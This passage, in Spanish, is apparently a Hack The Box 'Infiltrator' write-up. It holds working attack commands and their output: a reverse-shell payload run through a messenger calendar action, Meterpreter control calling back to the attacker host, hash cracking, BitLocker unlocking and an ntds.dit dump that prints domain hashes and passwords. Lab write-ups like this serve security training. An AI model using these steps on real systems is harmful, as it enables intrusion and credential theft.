O.Martinez es un usuario de interes ya que puede acceder por RDP. Tras verificar el calendario de este usuario en la aplicacion de Mensajes encontramos que existen dos eventos por dia que se repiten a la misma hora, se indica `Open Website`.

2025_20222275446.png[IMAGE]

Modificamos uno de estos eventos a una hora mas cercana y realizamos la Sincronizacion.

2025_20222275711.png[IMAGE]

Al llegar la hora se abrio el navegador con la url especificada.

2025_20222275844.png[IMAGE]

Dentro de la informacion de O.martinez encontramos que existe una sesion abierta dentro de la maquina. Si la sincronizacion del calendario tambien pasa en la otra sesion es probable que el sitio web tambien se abra de ese lado.

2025_20222270037.png[IMAGE]

Vemos que al crear un Evento se indican las `Actions`, entre ellas `Run application`.

2025_20222270155.png[IMAGE]

## Run application
Agregamos un nuevo evento agregando `calc.exe` como ejecucion.

2025_20222270540.png[IMAGE]

Tras cumplirse la hora la ejecucion fue exitosa localmente, por lo que es posible ejecutar cualquier aplicacion dada su direccion.
```bash
*Evil-WinRM* PS C:\Users\winrm_svc\Documents> ps | findstr calc
*Evil-WinRM* PS C:\Users\winrm_svc\Documents> ps | findstr calc
    192      23     6536      15840              6244   2 win32calc
*Evil-WinRM* PS C:\Users\winrm_svc\Documents>
```

## Shell via Run Aplication Event
Generamos un payload utilizando msfvenom con una shell inversa.
```bash
❯ msfvenom -p windows/x64/shell/reverse_tcp LHOST=tun0 LPORT=1338 -f exe -o shell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: shell.exe
❯ 
```
Ejecutamos metasploit especificando los valores necesarios para la escucha de nuestro payload.
```bash
❯ msfconsole -q
[*] Starting persistent handler(s)...
msf6 > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/shell/reverse_tcp
payload => windows/x64/shell/reverse_tcp
msf6 exploit(multi/handler) > set lhost tun0
lhost => tun0
msf6 exploit(multi/handler) > set lport 1338
lport => 1338
msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.10.14.58:1338 

```

Creamos un directorio temporal donde subimos nuestro payload dandole permisos de acceso para todos.
```bash
*Evil-WinRM* PS C:\Users\winrm_svc\Documents> cd C:/programdata
*Evil-WinRM* PS C:\programdata> mkdir temp


    Directory: C:\programdata


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        5/27/2025  10:12 PM                temp


*Evil-WinRM* PS C:\programdata> cd temp
*Evil-WinRM* PS C:\programdata\temp> upload shell.exe
                                        
Info: Uploading /home/kali/htb/infiltrator/shell.exe to C:\programdata\temp\shell.exe
                                        
Data: 9556 bytes of 9556 bytes copied
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\programdata\temp> icacls shell.exe /grant "Everyone:(F)"
processed file: shell.exe
Successfully processed 1 files; Failed processing 0 files
*Evil-WinRM* PS C:\programdata\temp> icacls shell.exe
shell.exe Everyone:(F)
          NT AUTHORITY\SYSTEM:(I)(F)
          BUILTIN\Administrators:(I)(F)
          INFILTRATOR\winrm_svc:(I)(F)
          BUILTIN\Users:(I)(RX)

Successfully processed 1 files; Failed processing 0 files
*Evil-WinRM* PS C:\programdata\temp>
```


Finalmente agregamos un nuevo evento especificando nuestro payload.

2025_20222271509.png[IMAGE]

Luego de cumplirse el evento logramos obtener una shell como o.martinez.
```bash
msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.10.14.58:1338 
[*] Sending stage (336 bytes) to 10.10.11.31
[*] Command shell session 1 opened (10.10.14.58:1338 -> 10.10.11.31:50562) at 2025-05-28 01:19:07 -0400


Shell Banner:
Microsoft Windows [Version 10.0.17763.6189]
-----
          

C:\Windows\system32>whoami
whoami
infiltrator\o.martinez

C:\Windows\system32>
```

## Upgrade Shell
Actualizamos la shell a una meterpreter especificando nuestra session que colocamos en background.
```bash
msf6 post(multi/manage/shell_to_meterpreter) > sessions 

Active sessions
===============

  Id  Name  Type               Information                                                      Connection
  --  ----  ----               -----------                                                      ----------
  1         shell x64/windows  Shell Banner: Microsoft Windows [Version 10.0.17763.6189] -----  10.10.14.58:1338 -> 10.10.11.31:50562 (10.10.11.31)

msf6 post(multi/manage/shell_to_meterpreter) > set session 1
session => 1
msf6 post(multi/manage/shell_to_meterpreter) > run
[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 10.10.14.58:1338 
[*] Post module execution completed
msf6 post(multi/manage/shell_to_meterpreter) > 
[*] Sending stage (203846 bytes) to 10.10.11.31
[*] Meterpreter session 2 opened (10.10.14.58:1338 -> 10.10.11.31:50599) at 2025-05-28 01:22:29 -0400
[*] Stopping exploit/multi/handler

msf6 post(multi/manage/shell_to_meterpreter) > sessions 

Active sessions
===============

  Id  Name  Type                     Information                                                      Connection
  --  ----  ----                     -----------                                                      ----------
  1         shell x64/windows        Shell Banner: Microsoft Windows [Version 10.0.17763.6189] -----  10.10.14.58:1338 -> 10.10.11.31:50562 (10.10.11.31)
  2         meterpreter x64/windows  INFILTRATOR\O.martinez @ DC01                                    10.10.14.58:1338 -> 10.10.11.31:50599 (10.10.11.31)

msf6 post(multi/manage/shell_to_meterpreter) > sessions -i 2
[*] Starting interaction with 2...

meterpreter > getuid
Server username: INFILTRATOR\O.martinez
meterpreter >
```

## pcapng File
Enumerando directorios de o.martinez encontramos un archivo `.pcapng` el cual descargamos.
```bash
meterpreter > dir
Listing: C:\users\o.martinez\appdata\Roaming\Output Messenger\FAAA\Received Files\203301
========================================================================================

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
100666/rw-rw-rw-  292244  fil   2024-02-23 19:10:21 -0500  network_capture_2024.pcapng

meterpreter > download network_capture_2024.pcapng
[*] Downloading: network_capture_2024.pcapng -> /home/kali/htb/infiltrator/network_capture_2024.pcapng
[*] Downloaded 285.39 KiB of 285.39 KiB (100.0%): network_capture_2024.pcapng -> /home/kali/htb/infiltrator/network_capture_2024.pcapng
[*] Completed  : network_capture_2024.pcapng -> /home/kali/htb/infiltrator/network_capture_2024.pcapng
meterpreter >
```

Tras abrir el archivo en Wireshark listamos los objetos por HTTP. Se muestra contenido hacia un login y dos archivos comprimidos.

2025_20221264351.png[IMAGE]

Filtramos por `http`, tras seguir las solicitudes encontramos una contrasena en una solicitud hacia `/login`.
```bash
POST /login HTTP/1.1
Host: 192.168.1.106:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 28
Origin: http://192.168.1.106:5000
Connection: keep-alive
Referer: http://192.168.1.106:5000/
Upgrade-Insecure-Requests: 1

authorization=securepassword
```

Una solicitud a `/api/change_auth_token` muestra un token que sugiere la contrasena de O.Martinez.
```bash
POST /api/change_auth_token HTTP/1.1
[Host: 192.168.1.106:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.168.1.106:5000/files]
Authorization: b0439fae31f8cbba6294af86234d5a28
new_auth_token: M@rtinez_P@ssw0rd!
Origin: http://192.168.1.106:5000
Connection: keep-alive
Cookie: session=eyJhdXRob3JpemF0aW9uIjoic2VjdXJlcGFzc3dvcmQifQ.ZdkzzA.K3sT3Ai7Sa9zWQDts-DMTRfp39Y
Content-Length: 0
```

Esta contrasena permite el acceso por SMB y RDP.
```bash
❯ netexec smb 10.10.11.31 -u O.martinez -p 'M@rtinez_P@ssw0rd!'
SMB         10.10.11.31     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:infiltrator.htb) (signing:True) (SMBv1:False) 
SMB         10.10.11.31     445    DC01             [+] infiltrator.htb\O.martinez:M@rtinez_P@ssw0rd! 
❯ netexec rdp 10.10.11.31 -u O.martinez -p 'M@rtinez_P@ssw0rd!'
RDP         10.10.11.31     3389   DC01             [*] Windows 10 or Windows Server 2016 Build 17763 (name:DC01) (domain:infiltrator.htb) (nla:True)
RDP         10.10.11.31     3389   DC01             [+] infiltrator.htb\O.martinez:M@rtinez_P@ssw0rd! (Pwn3d!)
❯
```

## Compressed Files
Guardamos los dos archivos listados en Wireshark.
```bash
❯ ll
.rw-r--r-- kali kali 204 KB Mon May 26 22:49:14 2025  BitLocker-backup(1).7z
.rw-r--r-- kali kali 5.4 KB Mon May 26 22:49:14 2025  BitLocker-backup.7z
.rw-rw-r-- kali kali 285 KB Mon May 26 22:31:20 2025  network_capture_2024.pcapng
❯ sha256sum BitLocker-backup.7z
360a9f858feb0e4cfb36aa23a94af861a42db501505cef936fafda29030334dc  BitLocker-backup.7z
❯ sha256sum "BitLocker-backup(1).7z"
234d12a1cba2fe180f39c5be432d9deca75c820725f98e5ca32bb57ca60d0f60  BitLocker-backup(1).7z
❯
```

El primero parece estar "danado" o incompleto.
```bash
❯ 7z x BitLocker-backup.7z

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=en_US.UTF-8 Threads:128 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 5484 bytes (6 KiB)

Extracting archive: BitLocker-backup.7z
ERROR: BitLocker-backup.7z
BitLocker-backup.7z
Open ERROR: Cannot open the file as [7z] archive


ERRORS:
Is not archive
    
Can't open as archive: 1
Files: 0
Size:       0
Compressed: 0
❯ 
```
El segundo necesita contrasena.
```bash
❯ 7z x 'BitLocker-backup(1).7z'

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=en_US.UTF-8 Threads:128 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 209327 bytes (205 KiB)

Extracting archive: BitLocker-backup(1).7z
--
Path = BitLocker-backup(1).7z
Type = 7z
Physical Size = 209327
Headers Size = 271
Method = LZMA2:20 7zAES
Solid = -
Blocks = 1

    
Enter password (will not be echoed):
```

## Cracking the Hash
Ejecutamos `7z2john` para obtener el hash que con john junto con el wordlist rockyou.txt ejecutamos sobre el archivo de hash, se muestra la contrasena.
```bash
❯ 7z2john 'BitLocker-backup(1).7z' > 7zhash
ATTENTION: the hashes might contain sensitive encrypted data. Be careful when sharing or posting these hashes
❯ john 7zhash --wordlist=$ROCK
Using default input encoding: UTF-8
Loaded 1 password hash (7z, 7-Zip archive encryption [SHA256 512/512 AVX512BW 16x AES])
Cost 1 (iteration count) is 524288 for all loaded hashes
Cost 2 (padding size) is 8 for all loaded hashes
Cost 3 (compression type) is 2 for all loaded hashes
Cost 4 (data length) is 209048 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
zipper           (BitLocker-backup(1).7z)     
1g 0:00:00:51 DONE (2025-05-26 22:57) 0.01946g/s 108.3p/s 108.3c/s 108.3C/s cadillac..theboss
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
❯
```

## BitLocker Backup
Tras descomprimir con la contrasena se muestra un archivo html.
```bash
❯ 7z x 'BitLocker-backup(1).7z'

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=en_US.UTF-8 Threads:128 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 209327 bytes (205 KiB)

Extracting archive: BitLocker-backup(1).7z
--
Path = BitLocker-backup(1).7z
Type = 7z
Physical Size = 209327
Headers Size = 271
Method = LZMA2:20 7zAES
Solid = -
Blocks = 1

    
Enter password (will not be echoed):
Everything is Ok

Folders: 1
Files: 1
Size:       792371
Compressed: 209327
❯ 
❯ ls
 BitLocker-backup   7zhash   BitLocker-backup(1).7z   BitLocker-backup.7z   network_capture_2024.pcapng
❯ ll BitLocker-backup
.rw-rw-r-- kali kali 774 KB Tue Feb 20 07:51:45 2024  'Microsoft account _ Clés de récupération BitLocker.html'
❯ 
```

Con la traduccion del contenido se lee claves de recuperacion para BitLocker.

2025_20221265856.png[IMAGE]

Name of the device | ID of the key | Recovery key
| --- |--- |--- |
Managment-PC | 0K0UD2A8 | 650540-413611-429792-307362-466070-397617-148445-087043


# BitLocker Access
Anteriormente encontramos credenciales que permiten el acceso a O.martinez por RDP, utilizamos estas con `xfreerdp3`.
```bash
xfreerdp3 /u:O.martinez /v:10.10.11.31 /d:infiltrator.htb /p:'M@rtinez_P@ssw0rd!' /cert:ignore
```

Tras lograr una sesion RDP identificamos un disco duro cifrado con Bitlocker.

2025_20223281129.png[IMAGE]

Ingresamos la clave de recuperacion que encontramos en el backup, esto nos permitio acceder al disco duro.

2025_20223281324.png[IMAGE]

Dentro del disco duro encontramos un unico archivo que sugiere un backup de credenciales.

2025_20223281441.png[IMAGE]

Realizamos la copia de este backup y lo descargamos.
```bash
meterpreter > dir
Listing: C:\users\o.martinez\documents
======================================

Mode              Size     Type  Last modified              Name
----              ----     ----  -------------              ----
100666/rw-rw-rw-  2055137  fil   2024-02-25 09:23:02 -0500  Backup_Credentials.7z
040777/rwxrwxrwx  0        dir   2024-02-19 20:44:35 -0500  My Music
040777/rwxrwxrwx  0        dir   2024-02-19 20:44:35 -0500  My Pictures
040777/rwxrwxrwx  0        dir   2024-02-19 20:44:35 -0500  My Videos
100666/rw-rw-rw-  402      fil   2024-08-23 11:07:14 -0400  desktop.ini

meterpreter > download Backup_Credentials.7z
[*] Downloading: Backup_Credentials.7z -> /home/kali/htb/infiltrator/Backup_Credentials.7z
[*] Downloaded 1.00 MiB of 1.96 MiB (51.02%): Backup_Credentials.7z -> /home/kali/htb/infiltrator/Backup_Credentials.7z
[*] Downloaded 1.96 MiB of 1.96 MiB (100.0%): Backup_Credentials.7z -> /home/kali/htb/infiltrator/Backup_Credentials.7z
[*] Completed  : Backup_Credentials.7z -> /home/kali/htb/infiltrator/Backup_Credentials.7z
meterpreter >
```

## NTDS.dit Backup
`7z` muestra que es un backup del archivo `ntds.dit` junto con `SECURITY` y `SAM`.
```bash
❯ 7z l Backup_Credentials.7z

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=en_US.UTF-8 Threads:128 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 2055137 bytes (2007 KiB)

Listing archive: Backup_Credentials.7z

--
Path = Backup_Credentials.7z
Type = 7z
Physical Size = 2055137
Headers Size = 250
Method = LZMA2:24
Solid = +
Blocks = 1

   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
2024-02-25 10:12:32 D....            0            0  Active Directory
2024-02-25 10:12:34 D....            0            0  registry
2024-02-25 10:12:34 ....A     35667968      2054887  Active Directory/ntds.dit
2024-02-25 10:00:07 ....A       262144               registry/SECURITY
2024-02-25 10:00:07 ....A     12582912               registry/SYSTEM
------------------- ----- ------------ ------------  ------------------------
2024-02-25 10:12:34           48513024      2054887  3 files, 2 folders
❯
```
Realizamos la extraccion de los archivos.
```bash
❯ 7z x Backup_Credentials.7z

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=en_US.UTF-8 Threads:128 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 2055137 bytes (2007 KiB)

Extracting archive: Backup_Credentials.7z
--
Path = Backup_Credentials.7z
Type = 7z
Physical Size = 2055137
Headers Size = 250
Method = LZMA2:24
Solid = +
Blocks = 1

Everything is Ok

Folders: 2
Files: 3
Size:       48513024
Compressed: 2055137
❯ 
❯ ll
drwxrwxr-x kali kali 4.0 KB Sun Feb 25 09:12:32 2024  'Active Directory'
[...]
drwxrwxr-x kali kali 4.0 KB Sun Feb 25 09:12:34 2024  registry
[...]
.rw-rw-r-- kali kali 2.0 MB Tue May 27 00:12:17 2025  Backup_Credentials.7z
[...]
❯
```
## NTDS secretsdump 
Ejecutamos `secretsdump` especificando los archivos y de manera local. Nos muestra los hashes de todos los usuarios.
```bash
❯ secretsdump.py -system registry/SYSTEM -security registry/SECURITY -ntds "Active Directory"/ntds.dit LOCAL
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0xd7e7d8797c1ccd58d95e4fb25cb7bdd4
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
$MACHINE.ACC:plain_password_hex:4b90048ad6028aae98f66484009266d4efa571d48a8aa6b771d69d20aba16ddb7e0a0ffe9378a1ac7b31a812f0760fe2a8ce66ff6a0ff772155a29baa59b4407a95a920d0904cba6f8b19b6393f1551a476f991bbedaa66880e60611482a81b31b34c55c77d0e0d1792e3b18cdc9d39e0b776e7ef082399b096aaa2e8d93eb1f0340fd5f6e138da2580d1f581ff9426dce99a901a1bf88ad3f19a5bc4ce8ff17fdbb0a04bb29f13dc46177a6d8cd61bf91f8342e33b5362daecbb888df22ce467aa9f45a9dc69b03d116eeac89857d17f3f44f4abc34165b296a42b3b3ff5ab26401b5734fab6ad142d7882715927e45
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:fe4767309896203c581b9fc3c5e23b00
[*] DefaultPassword 
(Unknown User):ROOT#123
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x81f5247051ff9535ad8299f0efd531ff3a5cb688
dpapi_userkey:0x79d13d91a01f6c38437c526396febaf8c1bc6909
[*] NL$KM 
 0000   2E 8A EC D8 ED 12 C6 ED  26 8E B0 9B DF DA 42 B7   ........&.....B.
 0010   49 DA B0 07 05 EE EA 07  05 02 04 0E AD F7 13 C2   I...............
 0020   6C 6D 8E 19 1A B0 51 41  7C 7D 73 9E 99 BA CD B1   lm....QA|}s.....
 0030   B7 7A 3E 0F 59 50 1C AD  8F 14 62 84 3F AC A9 92   .z>.YP....b.?...
NL$KM:2e8aecd8ed12c6ed268eb09bdfda42b749dab00705eeea070502040eadf713c26c6d8e191ab051417c7d739e99bacdb1b77a3e0f59501cad8f1462843faca992
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: d27644ab3070f72ec264fcb413d75299
[*] Reading and decrypting hashes from Active Directory/ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:7bf62b9c45112ffdadb7b6b4b9299dd2:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC$:1001:aad3b435b51404eeaad3b435b51404ee:fe4767309896203c581b9fc3c5e23b00:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:454fcbc37690c6e4628ab649e8e285a5:::
infiltrator.htb\winrm_svc:1104:aad3b435b51404eeaad3b435b51404ee:84287cd16341b91eb93a58456b73e30f:::
infiltrator.htb\lan_managment:1105:aad3b435b51404eeaad3b435b51404ee:e8ade553d9b0cb1769f429d897c92931:::
infiltrator.htb\M.harris:1106:aad3b435b51404eeaad3b435b51404ee:fc236589c448c620417b15597a3d3ca7:::
infiltrator.htb\D.anderson:1107:aad3b435b51404eeaad3b435b51404ee:627a2cb0adc7ba12ea11174941b3da88:::
infiltrator.htb\L.clark:1108:aad3b435b51404eeaad3b435b51404ee:627a2cb0adc7ba12ea11174941b3da88:::
infiltrator.htb\O.martinez:1109:aad3b435b51404eeaad3b435b51404ee:eb86d7bcb30c8eac1bdcae5061e2dff4:::
infiltrator.htb\A.walker:1110:aad3b435b51404eeaad3b435b51404ee:46389d8dfdfcf0cbe262a71f576e574b:::
infiltrator.htb\K.turner:1111:aad3b435b51404eeaad3b435b51404ee:48bcd1cdc870c6285376a990c2604531:::
infiltrator.htb\E.rodriguez:1112:aad3b435b51404eeaad3b435b51404ee:b1918c2ce6a62f4eee11c51b6e2e965a:::
[*] Kerberos keys from Active Directory/ntds.dit 
DC$:aes256-cts-hmac-sha1-96:09b3e08f549e92e0b16ed45f84b25cc6d0c147ff169ce059811a3ed9e6957176
DC$:aes128-cts-hmac-sha1-96:d2a3d7c9ee6965b1e3cd710ed1ceed0f
DC$:des-cbc-md5:5eea34b3317aea91
krbtgt:aes256-cts-hmac-sha1-96:f6e0a1bd3a180f83472cd2666b28de969442b7745545afb84bbeaa9397cb9b87
krbtgt:aes128-cts-hmac-sha1-96:7874dff8138091d6c344381c9c758540
krbtgt:des-cbc-md5:10bfc49ecd3b58d9
infiltrator.htb\winrm_svc:aes256-cts-hmac-sha1-96:ae473ae7da59719ebeec93c93704636abb7ee7ff69678fdec129afe2fc1592c4
infiltrator.htb\winrm_svc:aes128-cts-hmac-sha1-96:0faf5e0205d6f43ae37020f79f60606a
infiltrator.htb\winrm_svc:des-cbc-md5:7aba231386c2ecf8
infiltrator.htb\lan_managment:aes256-cts-hmac-sha1-96:6fcd2f66179b6b852bb3cc30f2ba353327924081c47d09bc5a9fafc623016e96
infiltrator.htb\lan_managment:aes128-cts-hmac-sha1-96:48f45b8eb2cbd8dbf578241ee369ddd9
infiltrator.htb\lan_managment:des-cbc-md5:31c83197ab944052
infiltrator.htb\M.harris:aes256-cts-hmac-sha1-96:20433af8bf6734568f112129c951ad87f750dddf092648c80816d5cb42ed0f49
infiltrator.htb\M.harris:aes128-cts-hmac-sha1-96:2ee0cd05c3fa205a92e6837ff212b7a0
infiltrator.htb\M.harris:des-cbc-md5:3ee3688376f2e5ce
infiltrator.htb\D.anderson:aes256-cts-hmac-sha1-96:42447533e9f1c9871ddd2137def662980e677a748b5d184da910d3c4daeb403f
infiltrator.htb\D.anderson:aes128-cts-hmac-sha1-96:021e189e743a78a991616821138e2e69
infiltrator.htb\D.anderson:des-cbc-md5:1529a829132a2345
infiltrator.htb\L.clark:aes256-cts-hmac-sha1-96:dddc0366b026b09ebf0ac3e7a7f190b491c4ee0d7976a4c3b324445485bf1bfc
infiltrator.htb\L.clark:aes128-cts-hmac-sha1-96:5041c75e19de802e0f7614f57edc8983
infiltrator.htb\L.clark:des-cbc-md5:cd023d5d70e6aefd
infiltrator.htb\O.martinez:aes256-cts-hmac-sha1-96:4d2d8951c7d6eba4edaf172fd0f7b78ab7260e3d513bf2ff387c70c85d912a2f
infiltrator.htb\O.martinez:aes128-cts-hmac-sha1-96:33fdf738e13878a8101e3bf929a5a120
infiltrator.htb\O.martinez:des-cbc-md5:f80bc202755d2cfd
infiltrator.htb\A.walker:aes256-cts-hmac-sha1-96:e26c97600c6f44990f18480087a685e0f1c71bcfbc8413dce6764ccf77df448a
infiltrator.htb\A.walker:aes128-cts-hmac-sha1-96:768672b783131ed963b9deeac0a6d2e4
infiltrator.htb\A.walker:des-cbc-md5:a7e6cde06d6e153b
infiltrator.htb\K.turner:aes256-cts-hmac-sha1-96:2c816a32b395f67df520bc734f7ea8e4df64a9610ffb3ef43e0e9df69b9df8b8
infiltrator.htb\K.turner:aes128-cts-hmac-sha1-96:b20f41c0d3b8fb6e1b793af4a835109b
infiltrator.htb\K.turner:des-cbc-md5:4607b9eaec6838ba
infiltrator.htb\E.rodriguez:aes256-cts-hmac-sha1-96:9114030dd2a57970530eda4ce0aa6b14f88f2be44f6d920de31eb6ee6f1587b5
infiltrator.htb\E.rodriguez:aes128-cts-hmac-sha1-96:ddd37cf706781414885f561c3b469d0c
infiltrator.htb\E.rodriguez:des-cbc-md5:9d5bdaf2cd26165d
[*] Cleaning up... 
❯
```

Intentamos utilizar el hash de administrator pero al ser un backup ha cambiado.
```bash
❯ netexec winrm 10.10.11.31 -u administrator -H 7bf62b9c45112ffdadb7b6b4b9299dd2
WINRM       10.10.11.31     5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:infiltrator.htb) 
WINRM       10.10.11.31     5985   DC01             [-] infiltrator.htb\administrator:7bf62b9c45112ffdadb7b6b4b9299dd2
❯ netexec rdp 10.10.11.31 -u administrator -H 7bf62b9c45112ffdadb7b6b4b9299dd2
RDP         10.10.11.31     3389   DC01             [*] Windows 10 or Windows Server 2016 Build 17763 (name:DC01) (domain:infiltrator.htb) (nla:True)
RDP         10.10.11.31     3389   DC01             [-] infiltrator.htb\administrator:7bf62b9c45112ffdadb7b6b4b9299dd2 (STATUS_LOGON_FAILURE)
❯ netexec smb 10.10.11.31 -u administrator -H 7bf62b9c45112ffdadb7b6b4b9299dd2
SMB         10.10.11.31     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:infiltrator.htb) (signing:True) (SMBv1:False) 
SMB         10.10.11.31     445    DC01             [-] infiltrator.htb\administrator:7bf62b9c45112ffdadb7b6b4b9299dd2 STATUS_LOGON_FAILURE 
❯
```

Ejecutamos netexec especificando el wordlist de usuarios y hashes pero unicamente se muestra valido l.clark.
```bash
❯ netexec smb 10.10.11.31 -u users.txt -H hashes_history --continue-on-success | grep +
SMB                      10.10.11.31     445    DC01             [+] infiltrator.htb\l.clark:627a2cb0adc7ba12ea11174941b3da88 
❯
```
## NTDS ntdsdotsqlite
[ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite) es una herramienta que permite obtener informacion de un archivo ntds.dit como una base de datos SQLite, realizamos la instalacion de este.
```bash
❯ git clone https://github.com/almandin/ntdsdotsqlite.git
Cloning into 'ntdsdotsqlite'...
remote: Enumerating objects: 182, done.
remote: Counting objects: 100% (182/182), done.
remote: Compressing objects: 100% (121/121), done.
remote: Total 182 (delta 106), reused 131 (delta 58), pack-reused 0 (from 0)
Receiving objects: 100% (182/182), 114.35 KiB | 1.27 MiB/s, done.
Resolving deltas: 100% (106/106), done.
❯ cd ntdsdotsqlite
❯ virtualenv env
created virtual environment CPython3.13.3.final.0-64 in 92ms
  creator CPython3Posix(dest=/home/kali/htb/infiltrator/tools/ntdsdotsqlite/env, clear=False, no_vcs_ignore=False, global=False)
  seeder FromAppData(download=False, pip=bundle, via=copy, app_data_dir=/home/kali/.local/share/virtualenv)
    added seed packages: pip==25.1.1
  activators BashActivator,CShellActivator,FishActivator,NushellActivator,PowerShellActivator,PythonActivator
❯ source env/bin/activate
❯ pip install .
Processing /home/kali/htb/infiltrator/tools/ntdsdotsqlite
  Installing build dependencies ... done
  Getting requirements to build wheel ... done
  Preparing metadata (pyproject.toml) ... done
Collecting dissect<4.0,>=3.5 (from dissect[ese]<4.0,>=3.5->ntdsdotsqlite==1.1.7)
[...] snip [...]
❯
```
Ejecutamos especificando el archivo ntds, system y el output de la base de datos.
```bash
❯ ntdsdotsqlite ~/htb/infiltrator/download/"Active Directory"/ntds.dit --system ~/htb/infiltrator/download/registry/SYSTEM -o ~/htb/infiltrator/files/NTDS.sqlite
100%|████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 3823/3823 [00:00<00:00, 30751.81it/s]
❯ file ~/htb/infiltrator/files/NTDS.sqlite
/home/kali/htb/infiltrator/files/NTDS.sqlite: SQLite 3.x database, last written using SQLite version 3046001, file counter 17, database pages 34, 1st free page 18, free pages 1, cookie 0x8, schema 4, UTF-8, version-valid-for 17
❯
```

Siguiendo el [modelo](https://github.com/almandin/ntdsdotsqlite/blob/main/sql_model.md) de la base de datos creamos un query para obtener informacion.
```bash
select displayName, SPN, UPN, login, samaccountname, nthash, lmhash, ntPwdHistory, description from user_accounts;
```
Encontramos informacion similar a la que muestra secretsdump, sin embargo dentro de la descripcion de lan_managment se muestra lo que parece ser una contrasena.
```bash
❯ sqlite3
SQLite version 3.46.1 2024-08-13 09:16:08
Enter ".help" for usage hints.
Connected to a transient in-memory database.
Use ".open FILENAME" to reopen on a persistent database.
sqlite> .open NTDS.sqlite
sqlite> .tables
containers            groups                trusted_domains     
domain_dns            machine_accounts      user_accounts       
domains               organizational_units
sqlite> select displayName, SPN, UPN, login, samaccountname, nthash, lmhash, ntPwdHistory, description from user_accounts;
|||Administrator|Administrator|7bf62b9c45112ffdadb7b6b4b9299dd2|aad3b435b51404eeaad3b435b51404ee|[]|Built-in account for administering the computer/domain
|||Guest|Guest|31d6cfe0d16ae931b73c59d7e0c089c0|aad3b435b51404eeaad3b435b51404ee|[]|Built-in account for guest access to the computer/domain
|["kadmin/changepw"]||krbtgt|krbtgt|454fcbc37690c6e4628ab649e8e285a5|aad3b435b51404eeaad3b435b51404ee|["454fcbc37690c6e4628ab649e8e285a5"]|Key Distribution Center Service Account
||winrm_svc@infiltrator.htb|winrm_svc|winrm_svc|84287cd16341b91eb93a58456b73e30f|aad3b435b51404eeaad3b435b51404ee|["84287cd16341b91eb93a58456b73e30f"]|User Security and Management Specialist
||lan_managment@infiltrator.htb|lan_managment|lan_managment|e8ade553d9b0cb1769f429d897c92931|aad3b435b51404eeaad3b435b51404ee|["e8ade553d9b0cb1769f429d897c92931"]|l@n_M@an!1331
||harris@infiltrator.htb|harris|M.harris|fc236589c448c620417b15597a3d3ca7|aad3b435b51404eeaad3b435b51404ee|["fc236589c448c620417b15597a3d3ca7"]|Head of Development Department

||anderson@infiltrator.htb|anderson|D.anderson|627a2cb0adc7ba12ea11174941b3da88|aad3b435b51404eeaad3b435b51404ee|["627a2cb0adc7ba12ea11174941b3da88"]|
||clark@infiltrator.htb|clark|L.clark|627a2cb0adc7ba12ea11174941b3da88|aad3b435b51404eeaad3b435b51404ee|["627a2cb0adc7ba12ea11174941b3da88"]|
||martinez@infiltrator.htb|martinez|O.martinez|eb86d7bcb30c8eac1bdcae5061e2dff4|aad3b435b51404eeaad3b435b51404ee|["eb86d7bcb30c8eac1bdcae5061e2dff4"]|
||walker@infiltrator.htb|walker|A.walker|46389d8dfdfcf0cbe262a71f576e574b|aad3b435b51404eeaad3b435b51404ee|["46389d8dfdfcf0cbe262a71f576e574b"]|
